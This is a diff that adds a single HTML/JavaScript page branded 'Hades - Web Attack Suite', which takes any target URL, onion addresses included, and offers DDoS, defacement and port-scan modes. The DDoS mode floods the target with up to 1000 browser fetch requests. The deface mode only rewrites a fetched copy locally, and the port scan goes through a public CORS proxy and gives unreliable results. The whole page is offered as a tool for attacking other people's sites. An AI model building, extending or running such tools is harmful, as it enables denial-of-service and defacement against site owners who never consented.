@@ -1,1 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hades - Web Attack Suite</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: monospace;
+            padding: 20px;
+        }
+        .container {
+            width: 80%;
+            margin: auto;
+            overflow: hidden;
+        }
+        input[type="text"], input[type="number"], button {
+            background-color: #333;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px;
+            margin-bottom: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button {
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #00ff00;
+            color: #000;
+        }
+        #log {
+            background-color: #111;
+            border: 1px solid #00ff00;
+            padding: 10px;
+            height: 200px;
+            overflow-y: scroll;
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Hades - Web Attack Suite</h1>
 
+        <label for="targetUrl">Target URL (.onion or normal):</label>
+        <input type="text" id="targetUrl" placeholder="http://example.com or onion address">
+
+        <label for="attackType">Attack Type:</label>
+        <select id="attackType">
+            <option value="ddos">DDoS</option>
+            <option value="deface">Deface</option>
+            <option value="connect">Connect (Port Scan)</option>
+        </select>
+
+        <label for="ddosThreads" id="ddosThreadsLabel" style="display:block;">DDoS Threads (Higher = Faster, Max 1000):</label>
+        <input type="number" id="ddosThreads" value="100" min="1" max="1000" style="display:block;">
+
+        <label for="defaceCode" id="defaceCodeLabel" style="display:none;">Deface HTML Code:</label>
+        <textarea id="defaceCode" style="width: 100%; height: 100px; background-color: #333; color: #00ff00; border: 1px solid #00ff00; display:none;"></textarea>
+
+        <label for="portScanPort" id="portScanPortLabel" style="display:none;">Port to Scan:</label>
+        <input type="number" id="portScanPort" value="80" min="1" max="65535" style="display:none;">
+
+        <button id="attackButton">Initiate Attack</button>
+
+        <h2>Log:</h2>
+        <div id="log"></div>
+    </div>
+
+    <script>
+        const targetUrlInput = document.getElementById('targetUrl');
+        const attackTypeSelect = document.getElementById('attackType');
+        const ddosThreadsInput = document.getElementById('ddosThreads');
+        const defaceCodeInput = document.getElementById('defaceCode');
+        const portScanPortInput = document.getElementById('portScanPort');
+        const attackButton = document.getElementById('attackButton');
+        const logDiv = document.getElementById('log');
+
+        const ddosThreadsLabel = document.getElementById('ddosThreadsLabel');
+        const defaceCodeLabel = document.getElementById('defaceCodeLabel');
+        const portScanPortLabel = document.getElementById('portScanPortLabel');
+
+        attackTypeSelect.addEventListener('change', function() {
+            const selectedAttack = attackTypeSelect.value;
+
+            ddosThreadsInput.style.display = 'none';
+            ddosThreadsLabel.style.display = 'none';
+            defaceCodeInput.style.display = 'none';
+            defaceCodeLabel.style.display = 'none';
+            portScanPortInput.style.display = 'none';
+            portScanPortLabel.style.display = 'none';
+
+            if (selectedAttack === 'ddos') {
+                ddosThreadsInput.style.display = 'block';
+                ddosThreadsLabel.style.display = 'block';
+            } else if (selectedAttack === 'deface') {
+                defaceCodeInput.style.display = 'block';
+                defaceCodeLabel.style.display = 'block';
+            } else if (selectedAttack === 'connect') {
+                portScanPortInput.style.display = 'block';
+                portScanPortLabel.style.display = 'block';
+            }
+        });
+
+
+        attackButton.addEventListener('click', () => {
+            const targetUrl = targetUrlInput.value;
+            const attackType = attackTypeSelect.value;
+
+            if (!targetUrl) {
+                logMessage('<span class="error">Target URL is required.</span>');
+                return;
+            }
+
+            if (attackType === 'ddos') {
+                const threads = parseInt(ddosThreadsInput.value);
+                if (isNaN(threads) || threads < 1 || threads > 1000) {
+                    logMessage('<span class="error">Invalid thread count. Must be between 1 and 1000.</span>');
+                    return;
+                }
+                logMessage(`Initiating DDoS attack on ${targetUrl} with ${threads} threads...`);
+                ddosAttack(targetUrl, threads);
+
+            } else if (attackType === 'deface') {
+                const defaceCode = defaceCodeInput.value;
+                if (!defaceCode) {
+                    logMessage('<span class="error">Deface code is required.</span>');
+                    return;
+                }
+                logMessage(`Initiating Deface attack on ${targetUrl}...`);
+                defaceSite(targetUrl, defaceCode);
+
+            } else if (attackType === 'connect') {
+                const port = parseInt(portScanPortInput.value);
+                 if (isNaN(port) || port < 1 || port > 65535) {
+                    logMessage('<span class="error">Invalid port number. Must be between 1 and 65535.</span>');
+                    return;
+                }
+                logMessage(`Initiating Port Scan on ${targetUrl}:${port}...`);
+                portScan(targetUrl, port);
+            }
+        });
+
+        function logMessage(message) {
+            logDiv.innerHTML += `<p>${message}</p>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+
+        function ddosAttack(targetUrl, threads) {
+           for (let i = 0; i < threads; i++) {
+                fetch(targetUrl, { mode: 'no-cors' })
+                    .then(() => logMessage(`DDoS thread ${i + 1}: Request sent to ${targetUrl}`))
+                    .catch((error) => logMessage(`DDoS thread ${i + 1}: Error - ${error}`));
+           }
+        }
+
+        function defaceSite(targetUrl, defaceCode) {
+             fetch(targetUrl, {
+                method: 'GET',
+                mode: 'cors'
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(originalHTML => {
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(originalHTML, 'text/html');
+
+                if (doc && doc.documentElement) {
+                    doc.documentElement.innerHTML = defaceCode;
+                    const modifiedHTML = doc.documentElement.outerHTML;
+
+                    logMessage(`Defacing ${targetUrl}... (Simulated, this only shows the result)`);
+                    logMessage(`<pre>${modifiedHTML}</pre>`);
+
+                } else {
+                    throw new Error('Could not parse the HTML content.');
+                }
+            })
+            .catch(error => {
+                logMessage(`<span class="error">Deface failed: ${error}</span>`);
+            });
+
+        }
+
+         function portScan(targetUrl, port) {
+            logMessage(`Scanning port ${port} on ${targetUrl}...`);
+
+            fetch(`https://cors-anywhere.herokuapp.com/${targetUrl}:${port}`, { mode: 'no-cors' })
+            .then(response => {
+                if (response.ok) {
+                    logMessage(`Port ${port} on ${targetUrl} is open (likely).`);
+                } else {
+                    logMessage(`Port ${port} on ${targetUrl} is closed or filtered.`);
+                }
+            })
+            .catch(error => {
+                logMessage(`Port ${port} on ${targetUrl} is closed or filtered (Error: ${error})`);
+            });
+        }
+    </script>
+</body>
+</html>
